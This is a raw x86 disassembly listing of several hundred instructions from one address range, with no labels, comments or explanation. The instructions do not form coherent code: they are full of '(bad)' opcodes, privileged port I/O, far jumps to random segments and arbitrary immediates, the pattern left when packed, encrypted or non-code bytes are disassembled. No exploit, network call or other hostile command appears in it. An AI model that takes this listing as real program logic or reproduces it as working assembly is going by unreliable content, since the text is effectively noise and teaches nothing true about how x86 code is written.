  40d1c6:	adc    ebp,DWORD PTR [ecx]
  40d1c8:	mov    ecx,0xfe5a5ceb
  40d1cd:	xchg   esp,eax
  40d1ce:	mov    edx,edx
  40d1d0:	jl     0x40d161
  40d1d2:	inc    esp
  40d1d3:	xchg   ecx,eax
  40d1d4:	iret   
  40d1d5:	js     0x40d179
  40d1d7:	xchg   ebx,eax
  40d1d8:	mov    al,0xbb
  40d1da:	cmp    BYTE PTR [ecx],al
  40d1dc:	xor    dl,cl
  40d1de:	out    0x5c,al
  40d1e0:	mov    dl,0xf9
  40d1e2:	and    DWORD PTR [ebp+0xf],edi
  40d1e5:	(bad)  
  40d1e6:	jmp    0xa5035f1b
  40d1eb:	sub    dl,BYTE PTR ds:0xe0e06e45
  40d1f1:	les    ebp,FWORD PTR [edx-0x67]
  40d1f4:	or     eax,0x7c3b08a5
  40d1f9:	push   edx
  40d1fa:	adc    DWORD PTR [eax-0x7b],ebx
  40d1fd:	push   0x66
  40d1ff:	or     ah,al
  40d201:	popf   
  40d202:	imul   ebx,DWORD PTR ds:[ebp+0x1e],0x51
  40d207:	stos   DWORD PTR es:[edi],eax
  40d208:	mov    ecx,0x5557504
  40d20d:	pusha  
  40d20e:	jmp    0x4bce:0x86f52b63
  40d215:	(bad)  
  40d216:	icebp  
  40d217:	xchg   edx,eax
  40d218:	out    0xc1,al
  40d21a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d21b:	lods   eax,DWORD PTR ds:[esi]
  40d21c:	pop    edi
  40d21d:	mov    bl,dh
  40d21f:	add    cl,cl
  40d221:	inc    ebx
  40d222:	cdq    
  40d223:	in     al,dx
  40d224:	in     eax,0xd2
  40d226:	xchg   edi,eax
  40d227:	fnstcw WORD PTR ds:0x4a7e4fa9
  40d22d:	inc    ebp
  40d22e:	inc    esi
  40d22f:	fstp   DWORD PTR [ebx]
  40d231:	xor    DWORD PTR [ecx+0x6d8b1849],ecx
  40d237:	retf   
  40d238:	sahf   
  40d239:	loope  0x40d273
  40d23b:	sub    BYTE PTR [esi+0x7d],cl
  40d23e:	clc    
  40d23f:	xchg   BYTE PTR [edi+0x53ef6d73],al
  40d245:	xchg   ecx,eax
  40d246:	push   es
  40d247:	fadd   DWORD PTR ds:0x54ba200c
  40d24d:	lods   eax,DWORD PTR ds:[esi]
  40d24e:	jb     0x40d21b
  40d250:	jmp    0x40d1fe
  40d252:	xchg   DWORD PTR [eax+0x1e],edi
  40d255:	inc    ebp
  40d256:	xor    DWORD PTR [edx+ebx*2-0x1319994c],0x47
  40d25e:	and    eax,0xae736ce7
  40d263:	push   es
  40d264:	push   ss
  40d265:	mov    ebx,0xe340b09
  40d26a:	mov    bh,0xd8
  40d26c:	loopne 0x40d1f9
  40d26e:	mov    eax,0x7ce2485a
  40d273:	push   es
  40d274:	pusha  
  40d275:	sbb    edi,DWORD PTR [edx]
  40d277:	dec    ebx
  40d278:	add    al,0x86
  40d27a:	icebp  
  40d27b:	jbe    0x40d29b
  40d27d:	sub    DWORD PTR [ebp+0x71],esp
  40d280:	fucomip st,st(3)
  40d282:	sub    DWORD PTR [edx-0x9919f3e],edx
  40d288:	xchg   DWORD PTR [eax-0x12],ecx
  40d28b:	shl    DWORD PTR [ebp+0x48cdfe6b],0x30
  40d292:	xor    ch,BYTE PTR [edi]
  40d294:	out    dx,eax
  40d295:	jmp    0x40d229
  40d297:	xchg   edx,eax
  40d298:	rcr    BYTE PTR [eax-0x5d],cl
  40d29b:	cmp    DWORD PTR [ebp-0x1fae8b66],ebp
  40d2a1:	mov    eax,ds:0xddfdcace
  40d2a6:	repz std 
  40d2a8:	xor    al,0x39
  40d2aa:	push   ebx
  40d2ab:	std    
  40d2ac:	leave  
  40d2ad:	sti    
  40d2ae:	cmc    
  40d2af:	outs   dx,BYTE PTR ds:[esi]
  40d2b0:	mov    bh,0x15
  40d2b2:	xchg   ebx,eax
  40d2b3:	mov    ecx,0x18adecc0
  40d2b8:	cmp    al,BYTE PTR [ecx+0x54740135]
  40d2be:	test   BYTE PTR [esi+0x6ba119e7],0xda
  40d2c5:	pushf  
  40d2c6:	cli    
  40d2c7:	loope  0x40d31d
  40d2c9:	add    al,0x53
  40d2cb:	xchg   esp,eax
  40d2cc:	test   ebp,edx
  40d2ce:	pop    edx
  40d2cf:	jns    0x40d2eb
  40d2d1:	lods   al,BYTE PTR ds:[esi]
  40d2d2:	(bad)  
  40d2d3:	push   esp
  40d2d4:	in     eax,dx
  40d2d5:	lock loope 0x40d2af
  40d2d8:	push   es
  40d2d9:	dec    ecx
  40d2da:	sub    al,BYTE PTR [edx]
  40d2dc:	mov    eax,ds:0x879489a7
  40d2e1:	aas    
  40d2e2:	pop    esp
  40d2e3:	push   ecx
  40d2e4:	fmul   st,st(6)
  40d2e6:	push   esi
  40d2e7:	int    0x78
  40d2e9:	fnstenv [ebx]
  40d2eb:	scas   eax,DWORD PTR es:[edi]
  40d2ec:	(bad)  
  40d2ed:	fcmovnu st,st(5)
  40d2ef:	push   esp
  40d2f0:	repz jne 0x40d279
  40d2f3:	mov    ch,0x21
  40d2f5:	ds push esi
  40d2f7:	xchg   ebp,eax
  40d2f8:	push   esp
  40d2f9:	(bad)
  40d2fc:	not    DWORD PTR [ebx+0x2f]
  40d2ff:	inc    esp
  40d300:	mov    bh,0xc7
  40d302:	cs in  eax,0xaf
  40d305:	adc    al,0x25
  40d307:	fs mov bl,0xc6
  40d30a:	and    DWORD PTR [esi],eax
  40d30c:	pop    eax
  40d30d:	fwait
  40d30e:	or     ebp,DWORD PTR [eax+0x6e]
  40d311:	dec    eax
  40d312:	imul   edi,DWORD PTR [eax+0x23d3de62],0xda3c4f52
  40d31c:	mov    ds:0x9282047f,al
  40d321:	cdq    
  40d322:	mov    ds:0xe8e4cbb5,al
  40d327:	(bad)  
  40d328:	rcl    BYTE PTR [edx+esi*2+0x52e68be7],1
  40d32f:	ins    BYTE PTR es:[edi],dx
  40d330:	dec    esi
  40d331:	mov    ch,0xf7
  40d333:	clc    
  40d334:	pushf  
  40d335:	cmp    DWORD PTR [eax-0x26],esi
  40d338:	enter  0xfcbe,0x74
  40d33c:	xchg   edx,eax
  40d33d:	xchg   ecx,eax
  40d33e:	stos   BYTE PTR es:[edi],al
  40d33f:	(bad)  
  40d341:	mov    al,0x63
  40d343:	and    DWORD PTR [edi],edx
  40d345:	mov    dl,0x7b
  40d347:	adc    BYTE PTR [ebx-0x5fc84986],ah
  40d34d:	adc    esi,DWORD PTR [edx+ebx*1+0x2b53523e]
  40d354:	jb     0x40d354
  40d356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d357:	pop    ebx
  40d358:	push   edx
  40d359:	jne    0x40d2dd
  40d35b:	adc    BYTE PTR ds:0xc3baef7,bl
  40d361:	inc    edx
  40d362:	jmp    DWORD PTR [ebx]
  40d364:	xor    bh,ch
  40d366:	mov    dh,0xb9
  40d368:	in     al,0x62
  40d36a:	mov    esi,0x64703c06
  40d36f:	xor    dl,cl
  40d371:	push   es
  40d372:	cwde   
  40d373:	lock and al,0x41
  40d376:	or     BYTE PTR ds:0xc80ea14b,0x40
  40d37d:	jne    0x40d379
  40d37f:	aas    
  40d380:	pop    esi
  40d381:	daa    
  40d382:	data16 xor al,0xa8
  40d385:	mov    dh,0xe2
  40d387:	enter  0x4c30,0x62
  40d38b:	lds    eax,FWORD PTR [ebx]
  40d38d:	add    esi,0x37
  40d390:	dec    ebp
  40d391:	test   eax,0xdc48b4ac
  40d396:	imul   esp,esp,0xf71db104
  40d39c:	pop    ecx
  40d39d:	xor    edi,DWORD PTR [edi-0x68]
  40d3a0:	cmp    ebp,DWORD PTR [eax-0x7e073d38]
  40d3a6:	and    BYTE PTR [edi],dh
  40d3a8:	sar    dh,1
  40d3aa:	jae    0x40d35f
  40d3ac:	dec    ebx
  40d3ad:	cld    
  40d3ae:	scas   al,BYTE PTR es:[edi]
  40d3af:	cmp    bh,al
  40d3b1:	pop    ebx
  40d3b2:	(bad)  
  40d3b4:	mul    DWORD PTR [eax-0x74]
  40d3b7:	aad    0xca
  40d3b9:	sub    eax,0xf581e043
  40d3be:	pop    esi
  40d3bf:	jno    0x40d381
  40d3c1:	stos   DWORD PTR es:[edi],eax
  40d3c2:	pop    ss
  40d3c3:	leave  
  40d3c4:	test   eax,0x569d4924
  40d3c9:	jmp    0x2dae91fd
  40d3ce:	out    dx,eax
  40d3cf:	mov    ds:0x83f956a7,al
  40d3d4:	nop
  40d3d5:	js     0x40d3f0
  40d3d7:	jecxz  0x40d366
  40d3d9:	sbb    al,0xb
  40d3db:	mov    ah,0x71
  40d3dd:	imul   ecx,DWORD PTR [ebx+ebp*8+0x5],0x78de02cd
  40d3e5:	fcom   QWORD PTR [edx+0x64]
  40d3e8:	aad    0xba
  40d3ea:	fxch   st(1)
  40d3ec:	inc    edx
  40d3ed:	mov    al,0x75
  40d3ef:	loop   0x40d411
  40d3f1:	out    0x9c,al
  40d3f3:	addr16 pop es
  40d3f5:	adc    eax,0xce4e0fae
  40d3fa:	cmp    bl,BYTE PTR [esi]
  40d3fc:	inc    esp
  40d3fd:	push   edx
  40d3fe:	popa   
  40d3ff:	pop    esp
  40d400:	xchg   edx,eax
  40d401:	fcomp  DWORD PTR [edx-0x61140bde]
  40d407:	adc    DWORD PTR [esi+0x70],0xffffff8e
  40d40b:	popa   
  40d40c:	xor    eax,0xdd221dad
  40d411:	das    
  40d412:	out    dx,eax
  40d413:	mov    esi,0xa2c7c993
  40d418:	adc    ch,BYTE PTR [eax+esi*2-0x64]
  40d41c:	pop    es
  40d41d:	xor    DWORD PTR [esi+0x4c],0xd63760d4
  40d424:	push   es
  40d425:	dec    edi
  40d426:	xor    DWORD PTR [edx+ebx*4+0x7],edi
  40d42a:	stos   DWORD PTR es:[edi],eax
  40d42b:	mov    ecx,0x8f0e2d2c
  40d430:	not    BYTE PTR [edi+0x3d292b48]
  40d436:	mov    edi,0x72db581
  40d43b:	or     bl,BYTE PTR [edx]
  40d43d:	mov    al,0xd6
  40d43f:	rol    DWORD PTR [esi-0x7ae4cb43],cl
  40d445:	inc    ebp
  40d446:	and    BYTE PTR [edx+edx*1+0x77891f01],cl
  40d44d:	lahf   
  40d44e:	rcr    DWORD PTR [edi+0x1474e901],cl
  40d454:	xor    eax,0x5317ad15
  40d459:	adc    cl,BYTE PTR [eax+0x188c23ce]
  40d45f:	push   ebp
  40d460:	(bad)  
  40d461:	push   eax
  40d462:	sbb    al,ch
  40d464:	pusha  
  40d465:	icebp  
  40d466:	(bad)  
  40d467:	sti    
  40d468:	inc    esi
  40d469:	test   ah,al
  40d46b:	add    al,0xc5
  40d46d:	push   edx
  40d46e:	data16 stc 
  40d470:	xlat   BYTE PTR ds:[ebx]
  40d471:	gs dec edx
  40d473:	push   esi
  40d474:	push   eax
  40d475:	adc    BYTE PTR [ecx-0x1b],al
  40d478:	ss hlt 
  40d47a:	pop    esi
  40d47b:	inc    ecx
  40d47c:	mov    BYTE PTR [ebx+0x75],dh
  40d47f:	pop    edx
  40d480:	and    al,0xaa
  40d482:	imul   edi,DWORD PTR [edi+ecx*4+0x5c],0x5e
  40d487:	adc    eax,0x9cd3bf24
  40d48c:	dec    edx
  40d48d:	inc    ecx
  40d48e:	repz inc ebp
  40d490:	test   BYTE PTR ds:0x37969a8f,ch
  40d496:	pop    es
  40d497:	inc    eax
  40d498:	pop    ecx
  40d499:	pop    ebp
  40d49a:	push   0xe5dcf54b
  40d49f:	fsubr  st(0),st
  40d4a1:	mov    edx,0xb9cf1037
  40d4a6:	fwait
  40d4a7:	mov    dh,0xc3
  40d4a9:	enter  0xe8b9,0xe3
  40d4ad:	in     eax,dx
  40d4ae:	cli    
  40d4af:	aaa    
  40d4b0:	jo     0x40d44d
  40d4b2:	sub    BYTE PTR [edx],dh
  40d4b4:	jp     0x40d4b1
  40d4b6:	inc    edx
  40d4b7:	idiv   DWORD PTR [ecx-0x6f]
  40d4ba:	xchg   ecx,eax
  40d4bb:	pop    esi
  40d4bc:	lea    ecx,[ebx-0x981f7df]
  40d4c2:	mov    al,0x30
  40d4c4:	cli    
  40d4c5:	adc    BYTE PTR [edx-0x6d419a82],ah
  40d4cb:	mov    esp,0x85b45cc3
  40d4d0:	mov    cl,0x13
  40d4d2:	div    BYTE PTR [edi+0x6e]
  40d4d5:	das    
  40d4d6:	jb     0x40d546
  40d4d8:	jg     0x40d550
  40d4da:	daa    
  40d4db:	pusha  
  40d4dc:	push   ebx
  40d4dd:	mov    ecx,esi
  40d4df:	xchg   DWORD PTR [esp+eax*4+0x1d],esi
  40d4e3:	inc    edx
  40d4e4:	mov    cl,0x3e
  40d4e6:	rcr    DWORD PTR [ebp+ebp*8+0x58],cl
  40d4ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4eb:	cdq    
  40d4ec:	das    
  40d4ed:	push   esp
  40d4ee:	inc    edi
  40d4ef:	push   ss
  40d4f0:	or     al,BYTE PTR ds:0xca5d5132
  40d4f6:	scas   al,BYTE PTR es:[edi]
  40d4f7:	scas   eax,DWORD PTR es:[edi]
  40d4f8:	out    dx,al
  40d4f9:	sar    DWORD PTR [ebx-0x1e6283e2],cl
  40d4ff:	(bad)
  40d502:	sahf   
  40d503:	inc    esp
  40d504:	jge    0x40d517
  40d506:	sar    BYTE PTR [ecx+0x25],1
  40d509:	fs adc al,0x8a
  40d50c:	add    DWORD PTR [ebp+eax*4+0x5d74a1f4],esp
  40d513:	cwde   
  40d514:	sti    
  40d515:	retf   0x8d26
  40d518:	xchg   ebp,eax
  40d519:	into   
  40d51a:	into   
  40d51b:	sub    al,BYTE PTR [eax-0x3c8f75e6]
  40d521:	mov    WORD PTR [ebp-0x73],ss
  40d524:	mov    cl,0xce
  40d526:	neg    cl
  40d528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d529:	xor    eax,0xa14141e3
  40d52e:	aaa    
  40d52f:	out    dx,al
  40d530:	std    
  40d531:	ins    BYTE PTR es:[edi],dx
  40d532:	and    eax,0xb2410294
  40d537:	jbe    0x40d4de
  40d539:	mov    ecx,0x2ca0bdf0
  40d53e:	mov    dl,BYTE PTR [ebx]
  40d540:	les    ecx,FWORD PTR [eax]
  40d542:	cdq    
  40d543:	jbe    0x40d500
  40d545:	mov    cl,0xd1
  40d547:	mov    dh,0x39
  40d549:	mov    WORD PTR [ebx-0x6b],cs
  40d54c:	mov    WORD PTR [esi],ss
  40d54e:	sbb    edi,DWORD PTR [ebp+0x11]
  40d551:	xor    ebp,DWORD PTR [esi+0x4e]
  40d554:	pop    es
  40d555:	mov    al,0x33
  40d557:	fs jg  0x40d57c
  40d55a:	rcl    DWORD PTR [esi-0xf],cl
  40d55d:	test   BYTE PTR [edx+edi*8+0x2f],0x6
  40d562:	mov    esp,0x80ed9eb3
  40d567:	cwde   
  40d568:	dec    esp
  40d569:	fcomp  QWORD PTR [edx]
  40d56b:	ja     0x40d55d
  40d56d:	adc    DWORD PTR [ebx],0xb8c0a357
  40d573:	ss loopne 0x40d541
  40d576:	mov    al,ds:0x7dc2549f
  40d57b:	push   esi
  40d57c:	mov    cl,0x6
  40d57e:	mov    ah,0xb5
  40d580:	inc    esi
  40d581:	or     ebx,DWORD PTR [esi-0xf]
  40d584:	jns    0x40d5bf
  40d586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d587:	bound  ebp,QWORD PTR [ecx-0x71]
  40d58a:	pop    esi
  40d58b:	adc    BYTE PTR [ebx],ah
  40d58d:	push   ecx
  40d58e:	dec    esi
  40d58f:	int    0xc
  40d591:	pop    ds
  40d592:	cdq    
  40d593:	(bad)  
  40d594:	sub    ebx,ebx
  40d596:	dec    eax
  40d597:	rol    dh,cl
  40d599:	shl    eax,0x93
  40d59c:	add    eax,0xaa28e807
  40d5a1:	xchg   ebp,eax
  40d5a2:	add    al,0xc6
  40d5a4:	cmp    BYTE PTR [eax+eiz*4+0x15],dh
  40d5a8:	call   0x9d3f:0xce6389b9
  40d5af:	int3   
  40d5b0:	and    esi,ebx
  40d5b2:	jo     0x40d576
  40d5b4:	outs   dx,BYTE PTR ds:[esi]
  40d5b5:	js     0x40d61d
  40d5b7:	call   FWORD PTR [eax-0x5a]
  40d5ba:	lods   eax,DWORD PTR ds:[esi]
  40d5bb:	mov    DWORD PTR [ebx],eax
  40d5bd:	fwait
  40d5be:	aas    
  40d5bf:	lods   eax,DWORD PTR ds:[esi]
  40d5c0:	pop    esp
  40d5c1:	mov    esp,0xd3a06b44
  40d5c6:	sar    DWORD PTR [edi+eax*8+0x2],cl
  40d5ca:	dec    esp
  40d5cb:	call   0xc9ebcb41
  40d5d0:	fwait
  40d5d1:	xlat   BYTE PTR ds:[ebx]
  40d5d2:	or     esp,DWORD PTR [edi+0x318c8985]
  40d5d8:	jp     0x40d5ad
  40d5da:	push   0x11c1158d
  40d5df:	fidiv  WORD PTR [edi]
  40d5e1:	and    eax,0x32b3098d
  40d5e6:	lods   eax,DWORD PTR ds:[esi]
  40d5e7:	test   al,0xb2
  40d5e9:	not    DWORD PTR [eax-0x60]
  40d5ec:	push   ebp
  40d5ed:	or     cl,BYTE PTR [eax]
  40d5ef:	bound  edi,QWORD PTR [edi-0x4cefa728]
  40d5f5:	rcr    DWORD PTR [ebp+eax*8+0x46],1
  40d5f9:	or     al,0xbf
  40d5fb:	mov    ds:0xe2e314ba,al
  40d600:	adc    DWORD PTR ds:0x8c0223f4,0xffffffba
  40d607:	jbe    0x40d641
  40d609:	in     al,0x15
  40d60b:	(bad)
  40d60e:	test   BYTE PTR [ebx+0x4b],bh
  40d611:	adc    esi,0xffffff85
  40d614:	stc    
  40d615:	push   0x71bb47bb
  40d61a:	imul   edi,DWORD PTR ds:0x3fe15fde,0xffffffa2
  40d621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d622:	bound  edx,QWORD PTR [edx+0x65]
  40d625:	jo     0x40d66d
  40d627:	dec    esp
  40d628:	mov    dl,0x90
  40d62a:	jmp    0x91dc2d2d
  40d62f:	inc    ebp
  40d630:	scas   eax,DWORD PTR es:[edi]
  40d631:	push   ds
  40d632:	aas    
  40d633:	pushf  
  40d634:	or     al,0xc5
  40d636:	or     BYTE PTR [eax-0x7d58b16d],cl
  40d63c:	aam    0x80
  40d63e:	(bad)  
  40d63f:	sti    
  40d640:	fcomp  DWORD PTR [esi+0x4a]
  40d643:	mov    ecx,0x40d2d8f3
  40d648:	loop   0x40d5f9
  40d64a:	mov    dh,0xf
  40d64c:	iret   
  40d64d:	fst    QWORD PTR [ebp-0x3301aa95]
  40d653:	xchg   edx,eax
  40d654:	ror    esi,1
  40d656:	sub    DWORD PTR [ebp-0x7a],eax
  40d659:	out    0x20,al
  40d65b:	push   DWORD PTR [ebx]
  40d65d:	adc    bh,bh
  40d65f:	out    0x60,eax
  40d661:	and    ebx,edx
  40d663:	sbb    cl,BYTE PTR [edx-0x1eb63baf]
  40d669:	dec    ebp
  40d66a:	leave  
  40d66b:	adc    dh,BYTE PTR [ebp+0x21]
  40d66e:	loop   0x40d68e
  40d670:	push   eax
  40d671:	inc    edi
  40d672:	dec    ecx
  40d673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d674:	inc    ebx
  40d675:	xor    eax,edx
  40d677:	xchg   ebx,eax
  40d678:	mov    ecx,0x5ec95355
  40d67d:	jmp    FWORD PTR [ebp-0x21ba63f8]
  40d683:	fnstcw WORD PTR [ebx-0x1f67c4c5]
  40d689:	rcr    BYTE PTR [edx],0x9f
  40d68c:	dec    eax
  40d68d:	test   al,0xf3
  40d68f:	aas    
  40d690:	mov    ds:0x1dae7a13,al
  40d695:	pop    ds
  40d696:	mov    al,ds:0xe446d293
  40d69b:	sbb    edx,ebx
  40d69d:	cmp    BYTE PTR [edi-0x5b31ffeb],al
  40d6a3:	lea    esp,[esi+eiz*1-0x7e45785a]
  40d6aa:	ja     0x40d643
  40d6ac:	out    0x94,eax
  40d6ae:	fcomp  QWORD PTR [eax-0x70]
  40d6b1:	mov    ah,0xfd
  40d6b3:	pop    ecx
  40d6b4:	mov    dh,0x16
  40d6b6:	iret   
  40d6b7:	retf   0x58ff
  40d6ba:	mov    DWORD PTR [eax+0x1a],esp
  40d6bd:	js     0x40d71b
  40d6bf:	sbb    esp,DWORD PTR [ecx-0x37]
  40d6c2:	or     eax,0xcfaf05d9
  40d6c7:	jae    0x40d681
  40d6c9:	das    
  40d6ca:	xor    dh,cl
  40d6cc:	jg     0x40d718
  40d6ce:	pop    esp
  40d6cf:	xor    ch,BYTE PTR [ebp+eiz*2-0x44]
  40d6d3:	adc    bl,BYTE PTR [edi-0x39efffdd]
  40d6d9:	mov    WORD PTR [edi+0x14],?
  40d6dc:	dec    edi
  40d6dd:	shr    DWORD PTR [ebp-0x5345e431],0x29
  40d6e4:	jne    0x40d721
  40d6e6:	popa   
  40d6e7:	pop    ecx
  40d6e8:	sub    eax,0xa5a4d291
  40d6ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ee:	mov    WORD PTR [ebx-0x8398993],es
  40d6f4:	push   edi
  40d6f5:	clc    
  40d6f6:	sub    DWORD PTR [esi+0x48fdf157],edx
  40d6fc:	or     BYTE PTR [edx+0x71],dh
  40d6ff:	mov    BYTE PTR [edx-0x4e8df7b4],dl
  40d705:	ud2    
  40d707:	out    0x79,eax
  40d709:	loope  0x40d6c4
  40d70b:	jae    0x40d6d2
  40d70d:	inc    ecx
  40d70e:	dec    ebx
  40d70f:	dec    ebp
  40d710:	xor    BYTE PTR [edx-0x6a],bh
  40d713:	lds    esp,FWORD PTR ds:0xb3e8b89f
  40d719:	push   eax
  40d71a:	sahf   
  40d71b:	rcr    ecx,1
  40d71d:	cli    
  40d71e:	sub    al,bh
  40d720:	xchg   ebp,eax
  40d721:	and    bl,dl
  40d723:	push   ds
  40d724:	xchg   esp,eax
  40d725:	fcom   QWORD PTR [ebx+0x67df7aed]
  40d72b:	pop    ds
  40d72c:	adc    edi,DWORD PTR [edx-0x40]
  40d72f:	jmp    0xe45c:0x2a2d581c
  40d736:	sub    ah,al
  40d738:	(bad)
  40d73b:	jmp    0x40d6d9
  40d73d:	retf   
  40d73e:	mov    WORD PTR [ecx-0x3f77c914],es
  40d744:	dec    esp
  40d745:	mov    eax,DWORD PTR [esp+edi*2-0x4fb83e66]
  40d74c:	push   ss
  40d74d:	mov    fs,WORD PTR [esi-0x6e]
  40d750:	fbld   TBYTE PTR [edi+0x1817ae3]
  40d756:	inc    esi
  40d757:	mov    esp,0xc24134
  40d75c:	ds sti 
  40d75e:	fisttp QWORD PTR [edi-0x6b]
  40d761:	inc    ebx
  40d762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d764:	xchg   esp,eax
  40d765:	pop    ecx
  40d766:	aas    
  40d767:	cmp    al,0x10
  40d769:	xor    BYTE PTR [ebp-0x4d],cl
  40d76c:	out    dx,eax
  40d76d:	xor    DWORD PTR [ecx+0x42],eax
  40d770:	xchg   ebp,esp
  40d772:	and    al,0x9d
  40d774:	adc    dh,BYTE PTR [edi+0x2c]
  40d777:	push   cs
  40d778:	fild   WORD PTR [ecx-0x11f5dc24]
  40d77e:	inc    edi
  40d77f:	push   DWORD PTR [edi]
  40d781:	and    al,0x62
  40d783:	jge    0x40d7b2
  40d785:	fidivr WORD PTR [esi+0x2b]
  40d788:	jne    0x40d735
  40d78a:	push   edi
  40d78b:	js     0x40d73d
  40d78d:	mov    cl,0xd6
  40d790:	xchg   edi,eax
  40d791:	jae    0x40d7db
  40d793:	xchg   edi,eax
  40d794:	(bad)  
  40d795:	fld    QWORD PTR [eax-0x8363eee]
  40d79b:	add    eax,0xbc4e90d0
  40d7a0:	push   cs
  40d7a1:	(bad)  
  40d7a2:	mov    eax,ds:0x65d1738e
  40d7a7:	scas   eax,DWORD PTR es:[edi]
  40d7a8:	or     esi,DWORD PTR [eax+eax*8]
  40d7ab:	push   0xffffffb0
  40d7ad:	iret   
  40d7ae:	idiv   DWORD PTR [ebp-0x6b]
  40d7b1:	mov    ch,0xb8
  40d7b3:	sub    DWORD PTR [edi],ebp
  40d7b5:	mov    dh,0x27
  40d7b7:	stos   DWORD PTR es:[edi],eax
  40d7b8:	pop    edi
  40d7b9:	xor    al,0x52
  40d7bb:	xchg   ebx,edx
  40d7bd:	pusha  
  40d7be:	test   BYTE PTR [ecx+0xf0e1340],dl
  40d7c4:	sub    bl,dh
  40d7c6:	je     0x40d840
  40d7c8:	inc    eax
  40d7c9:	and    bl,bl
  40d7cb:	adc    al,0x7a
  40d7cd:	push   eax
  40d7ce:	sub    DWORD PTR [ebp+0xf],0x61204524
  40d7d5:	ficom  WORD PTR [esi-0x1e99394e]
  40d7db:	inc    edi
  40d7dc:	adc    esp,DWORD PTR [ecx+0x4eef9190]
  40d7e2:	pop    esi
  40d7e3:	xor    al,0x45
  40d7e5:	or     BYTE PTR [eax-0x21],dh
  40d7e8:	push   cs
  40d7e9:	cmc    
  40d7ea:	xor    dh,BYTE PTR [eax]
  40d7ec:	int    0x25
  40d7ee:	pop    esi
  40d7ef:	aad    0xa0
  40d7f1:	sbb    cl,BYTE PTR [ecx]
  40d7f3:	es mov al,fs:0x9cb92668
  40d7fa:	add    al,0x36
  40d7fc:	add    al,0x35
  40d7fe:	mov    ecx,0x8a238ef7
  40d803:	dec    edi
  40d804:	int3   
  40d805:	fadd   st(3),st
  40d807:	je     0x40d82f
  40d809:	(bad)  
  40d80a:	push   edi
  40d80b:	ds addr16 clc 
  40d80e:	addr16 xchg esp,eax
  40d810:	cwde   
  40d811:	sub    BYTE PTR [eax+0x4323c6b3],bl
  40d817:	xchg   edi,eax
  40d818:	in     al,0xab
  40d81a:	pop    esi
  40d81b:	scas   eax,DWORD PTR es:[edi]
  40d81c:	inc    ebp
  40d81e:	inc    esp
  40d81f:	inc    ebp
  40d820:	cld    
  40d821:	or     edi,eax
  40d823:	cli    
  40d824:	add    ch,BYTE PTR [esi+edx*4]
  40d827:	and    al,0xb5
  40d829:	sub    dl,BYTE PTR [edi-0x7ae1977]
  40d82f:	sbb    eax,0x574949c9
  40d834:	jp     0x40d7b9
  40d836:	jle    0x40d85d
  40d838:	mov    eax,ds:0xaedf3478
  40d83d:	jae    0x40d825
  40d83f:	push   ebp
  40d840:	mov    edi,0xc9f140a6
  40d845:	pop    ecx
  40d846:	call   0x15:0x7ad7792a
  40d84d:	daa    
  40d84e:	cmp    al,0xce
  40d850:	addr16 add al,0x3a
  40d853:	mov    al,0x13
  40d855:	jecxz  0x40d7ef
  40d857:	fwait
  40d858:	or     eax,0x8dbe18a6
  40d85d:	pop    ebp
  40d85e:	scas   eax,DWORD PTR es:[edi]
  40d85f:	sbb    eax,0x91bd0f
  40d864:	sbb    esi,DWORD PTR [esp+eax*2-0x54]
  40d868:	sub    eax,0x2dfab77d
  40d86d:	sahf   
  40d86e:	iret   
  40d86f:	cmp    BYTE PTR [esi+0x47],ah
  40d872:	sbb    ebp,DWORD PTR [edi+0x16efe959]
  40d878:	jp     0x40d8c1
  40d87a:	in     eax,dx
  40d87b:	sub    al,0xa1
  40d87d:	sbb    edx,DWORD PTR [eax]
  40d87f:	cmp    eax,0xf698a434
  40d884:	stc    
  40d885:	adc    al,BYTE PTR [edx*2+0x4fdbfcb5]
  40d88c:	inc    esi
  40d88d:	mov    WORD PTR [edx+0x7c39a42f],fs
  40d893:	pop    ss
  40d894:	in     al,0x90
  40d896:	xor    DWORD PTR [edi+edi*8],0x167a1faf
  40d89d:	aad    0x86
  40d89f:	sub    ah,BYTE PTR [edi]
  40d8a1:	mov    bl,ch
  40d8a3:	dec    esi
  40d8a4:	int    0x33
  40d8a6:	mov    ch,0xa6
  40d8a8:	xchg   DWORD PTR [esi-0x62],edi
  40d8ab:	dec    edx
  40d8ac:	jmp    0xdd68f574
  40d8b1:	test   BYTE PTR [esi+0x78],ah
  40d8b4:	dec    ebp
  40d8b5:	ds push edi
  40d8b7:	loop   0x40d917
  40d8b9:	cld    
  40d8ba:	jns    0x40d8ec
  40d8bc:	sub    eax,0x7c50bea
  40d8c1:	push   esp
  40d8c2:	jge    0x40d8ac
  40d8c4:	enter  0x66cd,0x91
  40d8c8:	test   eax,0x7d97cefb
  40d8cd:	scas   eax,DWORD PTR es:[edi]
  40d8ce:	pop    ebx
  40d8cf:	rcl    esp,cl
  40d8d1:	adc    eax,0x94bed2bb
  40d8d6:	lock inc eax
  40d8d8:	xor    eax,0xb7373ecf
  40d8dd:	sbb    al,0xd
  40d8df:	cdq    
  40d8e0:	cdq    
  40d8e1:	enter  0x7b79,0x47
  40d8e5:	push   0xd9d1fbe5
  40d8ea:	mov    BYTE PTR [esi+0x5f],bl
  40d8ed:	and    al,0x6
  40d8ef:	dec    esp
  40d8f0:	pop    ss
  40d8f1:	jno    0x40d87d
  40d8f3:	sbb    esi,eax
  40d8f5:	neg    DWORD PTR [eax-0x12]
  40d8f8:	pop    es
  40d8f9:	jbe    0x40d8c3
  40d8fb:	xlat   BYTE PTR ds:[ebx]
  40d8fc:	mov    esi,0x4f3f9f89
  40d901:	out    0xc1,eax
  40d903:	aad    0x6
  40d905:	repz mov eax,ds:0x1e653d44
  40d90b:	into   
  40d90c:	or     DWORD PTR [edi-0x6590eee7],0xffffffcb
  40d913:	ds xor al,0x8e
  40d916:	aam    0x77
  40d918:	jae    0x40d944
  40d91a:	xor    DWORD PTR [eax],ebx
  40d91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d91d:	popa   
  40d91e:	retf   0x4029
